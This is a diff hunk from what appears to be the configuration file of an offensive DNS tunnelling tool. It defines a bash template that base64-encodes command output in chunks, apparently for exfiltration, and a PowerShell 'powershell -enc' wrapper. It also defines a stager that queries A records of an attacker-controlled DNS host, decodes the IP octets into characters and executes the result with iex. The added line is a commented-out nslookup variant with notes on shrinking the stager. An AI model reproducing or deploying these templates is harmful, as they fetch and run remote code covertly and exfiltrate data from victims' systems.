@@ -233,6 +233,7 @@ assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1
 ###########powershell definitions########
 assign powershell outer_cmd_template "powershell -enc %CMD_B64%"
 
+#assign powershell stager_dns_cmd "(nslookup -type=a %host%).split(' ')[-2]" #nslookup makes an additional ptr request trying to identify the name of the ns. make sure the ptr record exists otherwise it would be too slow. It drops the stager size to ~350 though
 assign powershell stager_dns_cmd 'Resolve-DnsName -ty a %host%|? Section -eq Answer|Select -Exp IPAddress' 
 assign powershell stager_host '"${_}.%UNIQUE_DNS_HOST%"'
 assign powershell stager_template 'iex((1..%ITERATIONS%|%{%STAGER_DNS_CMD%|%{$_.split(".")|%{[char][int]$_}}}) -join "")'
